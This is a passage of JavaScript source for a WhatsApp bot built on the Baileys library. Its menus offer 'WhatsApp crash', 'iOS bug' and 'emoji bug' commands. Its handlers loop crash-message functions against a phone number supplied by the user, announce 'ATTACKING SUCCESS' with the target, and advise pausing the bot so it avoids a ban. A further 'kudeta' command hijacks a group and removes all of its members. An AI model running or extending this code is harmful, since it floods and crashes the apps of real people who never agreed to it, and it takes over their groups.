┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈✧`
   let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: crashbugmenuD
                    }),
                    header: proto.Message.InteractiveMessage.Header.fromObject({
                        hasMediaAttachment: true,
                        documentMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7119-24/30129597_829817659174206_6300413901737393729_n.enc?ccb=11-4&oh=01_Q5AaIA5MAdyMQOjp8l42SnRy_8qjz9O8JH8vgPee1nIdko51&oe=66595EB9&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/png",
                            fileSha256: "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
                            jpegThumbnail: fkethmb,
                            fileLength: 120000,
                            mediaKey: "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
                            fileName: `▢ Hiii, ${m.pushName}`,
                            directPath: "/v/t62.7119-24/30129597_829817659174206_6300413901737393729_n.enc?ccb=11-4&oh=01_Q5AaIA5MAdyMQOjp8l42SnRy_8qjz9O8JH8vgPee1nIdko51&oe=66595EB9&_nc_sid=5e03e0",
                            contactVcard: true,
                            mediaKeyTimestamp: "1658703206"
                        }
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "cta_url",
                                "buttonParamsJson": `{\"display_text\":\"𝙔𝙤𝙪𝙏𝙪𝙗𝙚\",\"url\":\"${global.url}\"}`
                            }
                        ]
                    }),
                    contextInfo: {
                        isForwarded: false,
                        mentionedJid: [m.sender, owner + "@s.whatsapp.net"],
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: my.idCH,
                            newsletterName: 'Info Script GlobaL',
                        },
                        externalAdReply: {
                            title: "Special.Project",
                            body: "",
                            thumbnailUrl: global.painlogo,
                            thumbnail: anjay,
                            sourceUrl: 'https://GlobaL.carrd.co/#',
                            previewType: "VIDEO",
                            showAdAttribution: true,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                })
            }
        }
    }, { userJid: m.sender, quoted: pain });

    await Painzy.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
    await sleep(1000)
Painzy.sendMessage(m.chat, {react: {text: '🔱', key: m.key}})
    }
    break
    
    case 'inplacemenu': case 'vipbug': case 'vipbugmenu': {
inplacemenuD = `  ❮ \`𝐁𝐔𝐆 𝐈𝐍 𝐏𝐋𝐀𝐂𝐄 𝐕𝐈𝐏\` ❯
${global.simbol} 🌷 *[ᴊᴜᴍʟᴀʜ]*
${global.simbol} 🚮 *[ᴊᴜᴍʟᴀʜ]*
${global.simbol} ɪɴɪ
${global.simbol} ᴀᴍᴘᴀs
${global.simbol} ᴋɪɴɢ
${global.simbol} ᴊɪʀ *[ᴊᴜᴍʟᴀʜ]*
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈✧`
   let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: inplacemenuD
                    }),
                    header: proto.Message.InteractiveMessage.Header.fromObject({
                        hasMediaAttachment: true,
                        documentMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7119-24/30129597_829817659174206_6300413901737393729_n.enc?ccb=11-4&oh=01_Q5AaIA5MAdyMQOjp8l42SnRy_8qjz9O8JH8vgPee1nIdko51&oe=66595EB9&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/png",
                            fileSha256: "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
                            jpegThumbnail: fkethmb,
                            fileLength: 120000,
                            mediaKey: "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
                            fileName: `▢ Hiii, ${m.pushName}`,
                            directPath: "/v/t62.7119-24/30129597_829817659174206_6300413901737393729_n.enc?ccb=11-4&oh=01_Q5AaIA5MAdyMQOjp8l42SnRy_8qjz9O8JH8vgPee1nIdko51&oe=66595EB9&_nc_sid=5e03e0",
                            contactVcard: true,
                            mediaKeyTimestamp: "1658703206"
                        }
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "cta_url",
                                "buttonParamsJson": `{\"display_text\":\"𝙔𝙤𝙪𝙏𝙪𝙗𝙚\",\"url\":\"${global.url}\"}`
                            }
                        ]
                    }),
                    contextInfo: {
                        isForwarded: false,
                        mentionedJid: [m.sender, owner + "@s.whatsapp.net"],
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: my.idCH,
                            newsletterName: 'Info Script GlobaL',
                        },
                        externalAdReply: {
                            title: "Special.Project",
                            body: "",
                            thumbnailUrl: global.painlogo,
                            thumbnail: anjay,
                            sourceUrl: 'https://GlobaL.carrd.co/#',
                            previewType: "VIDEO",
                            showAdAttribution: true,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                })
            }
        }
    }, { userJid: m.sender, quoted: pain });

    await Painzy.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
    await sleep(1000)
Painzy.sendMessage(m.chat, {react: {text: '🔱', key: m.key}})
    }
    break
    
    case 'wamenu': case 'wacrashmenu': {
wamenuD = `  ❮ \`𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 𝐂𝐑𝐀𝐒𝐇\` ❯
${global.simbol} ʙᴇᴛᴀᴠ1 *<number>*
${global.simbol} ʙᴇᴛᴀᴠ2 *<number>*
${global.simbol} ᴡᴀ-ʙᴜsɪɴs *<number>*
${global.simbol} ᴡᴀ-ᴍᴏᴅ *<number>*
${global.simbol} ᴡᴀ-ᴏʀɪ *<number>*
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈✧`
   let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: wamenuD
                    }),
                    header: proto.Message.InteractiveMessage.Header.fromObject({
                        hasMediaAttachment: true,
                        documentMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7119-24/30129597_829817659174206_6300413901737393729_n.enc?ccb=11-4&oh=01_Q5AaIA5MAdyMQOjp8l42SnRy_8qjz9O8JH8vgPee1nIdko51&oe=66595EB9&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/png",
                            fileSha256: "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
                            jpegThumbnail: fkethmb,
                            fileLength: 120000,
                            mediaKey: "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
                            fileName: `▢ Hiii, ${m.pushName}`,
                            directPath: "/v/t62.7119-24/30129597_829817659174206_6300413901737393729_n.enc?ccb=11-4&oh=01_Q5AaIA5MAdyMQOjp8l42SnRy_8qjz9O8JH8vgPee1nIdko51&oe=66595EB9&_nc_sid=5e03e0",
                            contactVcard: true,
                            mediaKeyTimestamp: "1658703206"
                        }
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "cta_url",
                                "buttonParamsJson": `{\"display_text\":\"𝙔𝙤𝙪𝙏𝙪𝙗𝙚\",\"url\":\"${global.url}\"}`
                            }
                        ]
                    }),
                    contextInfo: {
                        isForwarded: false,
                        mentionedJid: [m.sender, owner + "@s.whatsapp.net"],
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: my.idCH,
                            newsletterName: 'Info Script GlobaL',
                        },
                        externalAdReply: {
                            title: "Special.Project",
                            body: "",
                            thumbnailUrl: global.painlogo,
                            thumbnail: anjay,
                            sourceUrl: 'https://GlobaL.carrd.co/#',
                            previewType: "VIDEO",
                            showAdAttribution: true,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                })
            }
        }
    }, { userJid: m.sender, quoted: pain });

    await Painzy.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
    await sleep(1000)
Painzy.sendMessage(m.chat, {react: {text: '🔱', key: m.key}})
    }
    break
    
    case 'emojibugmenu': case 'emojibug': {
emojibugmenuD = `  ❮ \`𝐄𝐌𝐎𝐉𝐈 𝐁𝐔𝐆\` ❯
${global.simbol} 😜 *<number>*
${global.simbol} 🚮 *<number>*
${global.simbol} 👅 *<number>*
${global.simbol} 🤓 *<number>*
${global.simbol} 💐 *<number>*
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈✧`
   let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: emojibugmenuD
                    }),
                    header: proto.Message.InteractiveMessage.Header.fromObject({
                        hasMediaAttachment: true,
                        documentMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7119-24/30129597_829817659174206_6300413901737393729_n.enc?ccb=11-4&oh=01_Q5AaIA5MAdyMQOjp8l42SnRy_8qjz9O8JH8vgPee1nIdko51&oe=66595EB9&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/png",
                            fileSha256: "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
                            jpegThumbnail: fkethmb,
                            fileLength: 120000,
                            mediaKey: "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
                            fileName: `▢ Hiii, ${m.pushName}`,
                            directPath: "/v/t62.7119-24/30129597_829817659174206_6300413901737393729_n.enc?ccb=11-4&oh=01_Q5AaIA5MAdyMQOjp8l42SnRy_8qjz9O8JH8vgPee1nIdko51&oe=66595EB9&_nc_sid=5e03e0",
                            contactVcard: true,
                            mediaKeyTimestamp: "1658703206"
                        }
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "cta_url",
                                "buttonParamsJson": `{\"display_text\":\"𝙔𝙤𝙪𝙏𝙪𝙗𝙚\",\"url\":\"${global.url}\"}`
                            }
                        ]
                    }),
                    contextInfo: {
                        isForwarded: false,
                        mentionedJid: [m.sender, owner + "@s.whatsapp.net"],
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: my.idCH,
                            newsletterName: 'Info Script GlobaL',
                        },
                        externalAdReply: {
                            title: "Special.Project",
                            body: "",
                            thumbnailUrl: global.painlogo,
                            thumbnail: anjay,
                            sourceUrl: 'https://GlobaL.carrd.co/#',
                            previewType: "VIDEO",
                            showAdAttribution: true,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                })
            }
        }
    }, { userJid: m.sender, quoted: pain });

    await Painzy.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
    await sleep(1000)
Painzy.sendMessage(m.chat, {react: {text: '🔱', key: m.key}})
    }
    break

case 'iosbugmenu': case 'iosbug': {
iosbugmenuD = `  ❮ \`𝐈𝐎𝐒 𝐁𝐔𝐆\` ❯
${global.simbol} *ɪᴏs-ʜᴀᴄᴋ* <number,jumlah>
${global.simbol} *ɪᴏs-ᴄʀᴀsʜ* <number,jumlah>
${global.simbol} *ɪᴏs-ʙᴇᴛᴀ* <number,jumlah>
${global.simbol} *ɪᴏs-ʙᴏᴏᴍ* <number,jumlah>
${global.simbol} *ɪᴏs-ɴᴜʟʟ* <number,jumlah>
${global.simbol} *ɪᴏs-ʙʟᴀsᴛ* <number,jumlah>
${global.simbol} *ɪᴏs-ʜᴀʀᴅ* <number,jumlah>
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈✧`
   let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: iosbugmenuD
                    }),
                    header: proto.Message.InteractiveMessage.Header.fromObject({
                        hasMediaAttachment: true,
                        documentMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7119-24/30129597_829817659174206_6300413901737393729_n.enc?ccb=11-4&oh=01_Q5AaIA5MAdyMQOjp8l42SnRy_8qjz9O8JH8vgPee1nIdko51&oe=66595EB9&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/png",
                            fileSha256: "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
                            jpegThumbnail: fkethmb,
                            fileLength: 120000,
                            mediaKey: "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
                            fileName: `▢ Hiii, ${m.pushName}`,
                            directPath: "/v/t62.7119-24/30129597_829817659174206_6300413901737393729_n.enc?ccb=11-4&oh=01_Q5AaIA5MAdyMQOjp8l42SnRy_8qjz9O8JH8vgPee1nIdko51&oe=66595EB9&_nc_sid=5e03e0",
                            contactVcard: true,
                            mediaKeyTimestamp: "1658703206"
                        }
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "cta_url",
                                "buttonParamsJson": `{\"display_text\":\"𝙔𝙤𝙪𝙏𝙪𝙗𝙚\",\"url\":\"${global.url}\"}`
                            }
                        ]
                    }),
                    contextInfo: {
                        isForwarded: false,
                        mentionedJid: [m.sender, owner + "@s.whatsapp.net"],
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: my.idCH,
                            newsletterName: 'Info Script GlobaL',
                        },
                        externalAdReply: {
                            title: "Special.Project",
                            body: "",
                            thumbnailUrl: global.painlogo,
                            thumbnail: anjay,
                            sourceUrl: 'https://GlobaL.carrd.co/#',
                            previewType: "VIDEO",
                            showAdAttribution: true,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                })
            }
        }
    }, { userJid: m.sender, quoted: pain });

    await Painzy.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
    await sleep(1000)
Painzy.sendMessage(m.chat, {react: {text: '🔱', key: m.key}})
    }
    break
case 'cekjodoh': {
if (!q) return m.reply(`Usage ${command} Nama\n\nExample : ${prefix + command} ${pushname}`)
var jodoh = ['yanti', 'bunda maria', 'monyet', 'uni bakwan', 'popo berby', 'mimi pery', 'suyono', 'uni oncom', 'kosong', 'susilo', 'yanto']
var jodoh = jodoh[Math.floor(Math.random() * jodoh.length)]
m.reply(`Nama : ${q}\nJodoh anda : *${jodoh}*`)
}
break

case 'cekkuota': {
if (!q) return m.reply(`Usage ${command} Nama\n\nExample : ${prefix + command} ${pushname}`)
var pulsa = ['1kb', '5mb', '20mb', '3gb', '5gb', '7gb', '10gb', '1gb', 'banteng 2gb', '2.5gb', '1tb', '7mb', 'habis', '1,3gb', '4,1gb', '0,1kb']
var pulsa = pulsa[Math.floor(Math.random() * pulsa.length)]
reply(`Nama : ${q}\nkuota anda : *${pulsa}*`)
}
break

case 'kudetathp': {
if (!isCreator) return reply(OnlyOwner)
if (!isGroup) return reply(`Only Group Command`)
if (!isAdmins && !isCreator) return PainzyPainzy.sendMessage('Only Admin')
if (!isBotAdmins) return Painzy.sendMessage(`Bot Not Stupid Admin`)
await Painzy.groupUpdateSubject(m.chat, '𝙆𝙐𝘿𝙀𝙏𝘼')
await Painzy.groupUpdateDescription(m.chat, '𝙆𝙐𝘿𝙀𝙏𝘼')
let data = participants.map((x) => x.id)
for (let x of data) {
if (x !== botNumber && x !== groupMetadata.owner && x !== kontributor + "@s.whatsapp.net") {
await Painzy.groupParticipantsUpdate(m.chat, [x], "remove")
}}}
break

case 'apresiasi': {
    if (!isCreator) return
    const appreciationMessages = [
        'Nee nee, arigatou gozaimasu!',
        'Arigatou gozaimasu!',
        'Hontou ni arigatou!',
        'Domo arigatou!',
        'Kamsahamnida!',
        'Suksma!',
        'Arigatou ne!',
        'Sokushin shiteimasu!',
        'Tasukete kurete arigatou!',
        'Ichi-ichi arigatou!',
        'Mochiron arigatou!',
        'Kanpai!',
        'Arigatou gozaimasu, subarashii!',
        'Hontou ni arigatou gozaimasu!',
        'Osewa ni narimashita!',
        'Yoroshiku onegaishimasu!',
        'Shukran!',
        'Domo domo!',
        'Arigatou gozaimashita!',
        'Nandemonai desu!',
        'Arigatou gozaimasu, subarashii!'
    ];

    const randomIndex = Math.floor(Math.random() * appreciationMessages.length);
    const selectedMessage = appreciationMessages[randomIndex];

    await reply(selectedMessage);
}
break;

case '🌷':
case '🚮': 
case 'jir':
  let virusNames = {
    '🌷': 'Lynn cantik',
    '🚮': 'Painzy Imut',
    'jirlynn': 'lynn Lesbi'
  }

  if (!isCreator) return

    // Jumlah
  let jumlah = text.split(" ")[1];
  jumlah = jumlah && !isNaN(jumlah) ? parseInt(jumlah) : 1;
  
  starttask(emooji)

  for (let j = 0; j < jumlah; j++) {
    await sendPaymentInfoMessage(m.chat, painzybug)
    await sendPaymentInfoMessage(m.chat, force2)
    await bakdok(m.chat, painzybug)
    await sendPaymentInfoMessage(m.chat, painzybug)
    await sendPaymentInfoMessage(m.chat, force2)
    await bakdok(m.chat, painzybug)
    await sendPaymentInfoMessage(m.chat, painzybug)
    await penghitaman(m.chat, painbug)
    await sendPaymentInfoMessage(m.chat, zpay)
    await iponcrash(m.chat, force)
    await sendPaymentInfoMessage(m.chat, painbug)
    await sendSystemCrashMessage(m.chat, force)
    await sendPaymentInfoMessage(m.chat, painzybug)
    await iponcrash(m.chat, painzybug)
    await sendPaymentInfoMessage(m.chat, force)
    await penghitaman(m.chat, painbug)
    await sendPaymentInfoMessage(m.chat, painzybug)
    await sendPaymentInfoMessage(m.chat, zpay)
    await ngeloc(m.chat, force)
    await sendPaymentInfoMessage(m.chat, zpay)
    await bakdok(m.chat, painzybug)
    await sendPaymentInfoMessage(m.chat, force2)
    await penghitaman(m.chat, painbug)
    await sendPaymentInfoMessage(m.chat, force)
    await sendPaymentInfoMessage(m.chat, painbug)
    await ngeloc(m.chat, force2)
    Painzy.sendMessage(m.chat, {text: `\`𝘔𝘢𝘳𝘬 𝘍𝘶𝘤𝘬𝘺𝘰𝘶\``}, {quoted: m})
    Painzy.sendMessage(m.chat, {text: `\`𝘔𝘢𝘳𝘬 𝘍𝘶𝘤𝘬𝘺𝘰𝘶\``}, {quoted: m})
    Painzy.sendMessage(m.chat, {text: `\`𝘔𝘢𝘳𝘬 𝘍𝘶𝘤𝘬𝘺𝘰𝘶\``}, {quoted: m})
    Painzy.sendMessage(m.chat, {text: `\`𝘔𝘢𝘳𝘬 𝘍𝘶𝘤𝘬𝘺𝘰𝘶\``}, {quoted: m})
    await sendPaymentInfoMessage(m.chat)
    await sendPaymentInfoMessage(m.chat, force2)
    await bakdok(m.chat, painzybug)
  }

  await Painzy.sendMessage(m.chat, {
    contextInfo: {
      mentionedJid: ['00000@s.whatsapp.net'],
      externalAdReply: {
        showAdAttribution: false,
        renderLargerThumbnail: false,
        jpegThumbnail: fakejpg,
        title: "GlobalTechInfo",
        body: `⁗ ⋄ 𝐘𝐎𝐔 𝐖𝐈𝐋𝐋 𝐃𝐈𝐄!! `,
        previewType: "VIDEO",
        sourceUrl: `꫟Кz-Ж𝐭𝐞𝐧𝐭𝐢𝐨𝐧 || 𝐂𝐳𝐀.𝐕𝐢𝐫𝐮𝐬⿻`,
        mediaType: 1,
        mediaUrl: `${global.url}`
      }
    }, //Text For Bug
    text: '<✨> 𝗟𝗼𝘀𝘁 𝗟𝗶𝗴𝗵𝘁 & 𝗦𝘄𝗲𝗲𝘁 𝗟𝗶𝗲\n<!> Sayonaraaa, Senpai!\n\n「 𝐋𝐙𝐱𝐃-Ж-𝐕𝐢𝐫𝐮𝐬 」'
  }, {
    quoted: null
  })
   await sleep(2000)
let msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                    text: ''
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: "© GlobaL.Hunter"
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                    title: `⸙ 𝐊𝐢𝐧𝐠 𝐖𝐢𝐥𝐥 𝐄𝐫𝐚𝐝𝐢𝐜𝐚𝐭𝐞 𝐄𝐯𝐞𝐫𝐲𝐭𝐡𝐢𝐧𝐠!

— ႒𝐏̸͜𝐀͠𝐈͢𝐍͡𝐙̸̼𝐘়𝐄͡͡𝐗𝐄𝐂̸͜𝐔𝐓𝐈𝐎̽͢𝐍 ‹›`,
                    subtitle: "GlobaL Crash",
                    hasMediaAttachment: true,
                    ...(await prepareWAMessageMedia(
                        {
                            image: { url: randomImage }
                        },
                        { upload: Painzy.waUploadToServer }
                    ))
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
                        {
                            "name": "quick_reply",
                            "buttonParamsJson": `{\"display_text\":\"🔱 ࿖ GlobaL\",\"id\":\"lagidonggg\"}`
                        }
                    ],
                })
            })
        }
    }
}, {})

await Painzy.relayMessage(
    msg.key.remoteJid,
    msg.message,
    { messageId: msg.key.id }
)
break


case 'ini': 
case 'virtex': 
case 'Global': 
 let painzyVirus = {
 'GlobaL': 'GlobaL-cantik',
 'ampas': 'GlobaL-Execute',
 'inilynn': 'GlobaL-NeverDie'
}
if (!isCreator) return
for (let j = 0; j < 2; j++) {
await sendPaymentInfoMessage(m.chat, force2)
await bakdok(m.chat, painzybug)
await sendPaymentInfoMessage(m.chat, painzybug)
await sendPaymentInfoMessage(m.chat, force2)
await bakdok(m.chat, painzybug)
await sendPaymentInfoMessage(m.chat, painzybug)
await penghitaman(m.chat, painbug)
await sendPaymentInfoMessage(m.chat, zpay)
await iponcrash(m.chat, force)
await sendPaymentInfoMessage(m.chat, painbug)
await sendSystemCrashMessage(m.chat, force)
await sendPaymentInfoMessage(m.chat, painzybug)
await iponcrash(m.chat, painzybug)
await sendPaymentInfoMessage(m.chat, force)
await penghitaman(m.chat, painbug)
await sendPaymentInfoMessage(m.chat, painzybug)
await sendPaymentInfoMessage(m.chat, zpay)
await ngeloc(m.chat, force)
await sendPaymentInfoMessage(m.chat, zpay)
await bakdok(m.chat, painzybug)
await sendPaymentInfoMessage(m.chat, force2)
await penghitaman(m.chat, painbug)
await sendPaymentInfoMessage(m.chat, force)
await sendPaymentInfoMessage(m.chat, painbug)
await ngeloc(m.chat, force2)
Painzy.sendMessage(m.chat, {text: `\`𝘔𝘢𝘳𝘬 𝘍𝘶𝘤𝘬𝘺𝘰𝘶\``}, {quoted: m})
Painzy.sendMessage(m.chat, {text: `\`𝘔𝘢𝘳𝘬 𝘍𝘶𝘤𝘬𝘺𝘰𝘶\``}, {quoted: m})
Painzy.sendMessage(m.chat, {text: `\`𝘔𝘢𝘳𝘬 𝘍𝘶𝘤𝘬𝘺𝘰𝘶\``}, {quoted: m})
Painzy.sendMessage(m.chat, {text: `\`𝘔𝘢𝘳𝘬 𝘍𝘶𝘤𝘬𝘺𝘰𝘶\``}, {quoted: m})
await sendPaymentInfoMessage(m.chat)
await sendPaymentInfoMessage(m.chat, force2)
await bakdok(m.chat, painzybug)
await sendPaymentInfoMessage(m.chat, painzybug)
}
await Painzy.sendMessage(m.chat, {
    contextInfo: {
    mentionedJid: ['00000@s.whatsapp.net'],
    externalAdReply: {
    showAdAttribution: false,
    renderLargerThumbnail: false,
    jpegThumbnail: fakejpg,
    title: "GlobaL",
    body: `⁗ ⋄ 𝐘𝐎𝐔 𝐖𝐈𝐋𝐋 𝐃𝐈𝐄!! `,
    previewType: "VIDEO",
    sourceUrl: `꫟Кz-Ж𝐭𝐞𝐧𝐭𝐢𝐨𝐧 || 𝐂𝐳𝐀.𝐕𝐢𝐫𝐮𝐬⿻`,
    mediaType: 1,
    mediaUrl: `${global.url}`
    }
   }, //Text For Bug
  text: '<✨> 𝗟𝗼𝘀𝘁 𝗟𝗶𝗴𝗵𝘁 & 𝗦𝘄𝗲𝗲𝘁 𝗟𝗶𝗲\n<!> Sayonaraaa, Senpai!\n\n「 𝐋𝐙𝐱𝐃-Ж-𝐕𝐢𝐫𝐮𝐬 」'
}, {
quoted: null
})
await sleep(2000)
msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                    text: ''
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: "© Qasim.Hunter"
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                    title: `⸙ 𝐊𝐢𝐧𝐠 𝐖𝐢𝐥𝐥 𝐄𝐫𝐚𝐝𝐢𝐜𝐚𝐭𝐞 𝐄𝐯𝐞𝐫𝐲𝐭𝐡𝐢𝐧𝐠!

— ႒𝐏̸͜𝐀͠𝐈͢𝐍͡𝐙̸̼𝐘়𝐄͡͡𝐗𝐄𝐂̸͜𝐔𝐓𝐈𝐎̽͢𝐍 ‹›`,
                    subtitle: "Qasim-AlwasyForU",
                    hasMediaAttachment: true,
                    ...(await prepareWAMessageMedia(
                        {
                            image: { url: randomImage }
                        },
                        { upload: Painzy.waUploadToServer }
                    ))
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
                        {
                            "name": "quick_reply",
                            "buttonParamsJson": `{\"display_text\":\"🔱 ࿖ 𝐏⃟𝐚𝐢𝐧͡҈𝐳̢𝐲𝐱𝐙͢\",\"id\":\"lagidonggg\"}`
                        }
                    ],
                })
            })
        }
    }
}, {})

await Painzy.relayMessage(
    msg.key.remoteJid,
    msg.message,
    { messageId: msg.key.id }
)
break

case 'betav1': case 'betav2': case 'wa-ori': case 'wa-busins': case 'wa-mod': {
    if (!isCreator) return reply(mess.OnlyOwner)
    if (!text) return reply(`Example: .${command} 923xxx`)
    
    let peler = q.replace(/[^0-9]/g, "")
    if (peler.startsWith('0')) return reply(`\`[ # ]\` Enter Country Code Initial Number\n\n\`[ # ]\` Example : .${command} 923xxx`)
    
    let Pe = peler + '@s.whatsapp.net'
    await reply(mess.bugrespon)
   
    let virusNames = {
        'painzybetav1': 'Painzy-Reborn',
        'painzybetav2': 'Painzy-Xtreme',
        'wa-ori': 'WhatsApp-Origin',
        'wa-busins': 'Business-Blaster',
        'wa-mod': 'Hack-Lock'
    }

    for (let j = 0; j < 5; j++) {
        await sendPaymentInfoMessage(Pe, force2)
        await bakdok(Pe, painzybug)
        await sendPaymentInfoMessage(Pe, painzybug)
        await sendPaymentInfoMessage(Pe, force2)
        await bakdok(Pe, painzybug)
        await sendPaymentInfoMessage(Pe, painzybug)
        await penghitaman(Pe, painbug)
        await sendPaymentInfoMessage(Pe, zpay)
        await iponcrash(Pe, force)
        await sendPaymentInfoMessage(Pe, painbug)
        await sendSystemCrashMessage(Pe, force)
        await sendPaymentInfoMessage(Pe, painzybug)
        await iponcrash(Pe, painzybug)
        await sendPaymentInfoMessage(Pe, force)
        await penghitaman(Pe, painbug)
        await sendPaymentInfoMessage(Pe, painzybug)
        await sendPaymentInfoMessage(Pe, zpay)
        await ngeloc(Pe, force)
        await sendPaymentInfoMessage(Pe, zpay)
        await bakdok(Pe, painzybug)
        await sendPaymentInfoMessage(Pe, force2)
        await penghitaman(Pe, painbug)
        await sendPaymentInfoMessage(Pe, force)
        await sendPaymentInfoMessage(Pe, painbug)
        await ngeloc(Pe, force2)
    if (j === 1) { 
        msg = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
                message: {
                    "messageContextInfo": {
                        "deviceListMetadata": {},
                        "deviceListMetadataVersion": 2
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: ''
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            text: "© Qasim.Hunter"
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            title: `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」

𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : *${Pe}*
𖥂 𝐕𝐈𝐑𝐔𝐒 : *${virusNames[command]}*

┌────᚜「 𝗡𝗼𝘁𝗲 」
╰┈ Pause the bot for 10 minutes, So The Bot Doesn't Get 𝗕𝗮𝗻𝗻𝗲𝗱

—𝗧𝗵𝗲 𝗧𝗮𝗿𝗴𝗲𝘁 𝗛𝗮𝘀 𝗕𝗲𝗲𝗻 𝗙𝗮𝗹𝗹𝗲𝗻 ‹›`,
                            subtitle: "Qasim-AlwasyForU",
                            hasMediaAttachment: true,
                            ...(await prepareWAMessageMedia(
                                {
                                    image: { url: randomImage }
                                },
                                { upload: Painzy.waUploadToServer }
                            ))
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            buttons: [
                                {
                                    "name": "cta_url",
                                    "buttonParamsJson": `{\"display_text\":\"Owner\",\"url\":\"${global.tele}\"}`
                                },
                                {
